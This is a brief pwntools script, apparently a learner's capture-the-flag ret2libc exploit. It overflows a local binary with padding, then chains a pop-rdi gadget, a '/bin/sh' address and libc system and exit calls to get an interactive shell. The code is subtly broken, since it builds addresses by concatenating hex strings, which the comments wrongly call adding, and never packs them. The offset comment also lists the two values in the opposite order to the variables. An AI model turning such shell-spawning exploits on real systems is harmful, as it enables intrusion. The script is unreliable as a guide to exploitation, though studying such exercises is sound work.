from pwn import *

#padding
rip_offset = 273
padding = "A" * rip_offset

#offests for system and exit
#(0x0000000000044be0)
#(0x00000000000503c0)

#addrs
libc_base_addr = ("0x00007ffff7dc9000")
libc_system = ("0x00007ffff7dc9000" + "0x00000000000503c0")
libc_exit = ("0x00007ffff7dc9000" + "0x0000000000044be0")
binsh_addr = ("0x7ffff7f7741f")
pop_rdi_ret = ("0x00000000004011d3")

#So we need our libc_base so we can add the offset of system and exit with the base to get an address for system and exit.
#So this is the reason im adding together the strings for an output that we send as an arg to our binary!


#payload
payload = padding + pop_rdi_ret + binsh_addr + libc_system + libc_exit

#print(hex(libc_system))
#print(hex(libc_exit))
#You can do this to see if you get a proper system and exit addr

#Setting up our pwntools for our processes
proc = process("./vuln_bin")  #My binary name
proc.sendline(payload)        #Sending my payload
proc.interactive()            #Making my shell interactive

#Some tools I used were the pwntools python module, the ropgadget tool to get my pop_rdi ; ret instruction, and I used ldd and readelf to get my libc_base and the
#offsets for libc_system and libc_exit, I also used a gdb (GNU linux command line debugger) plugin known as "gef" which is what I used to find the offset for the
#RIP address and was able to cause segmentation faults to get a offset.
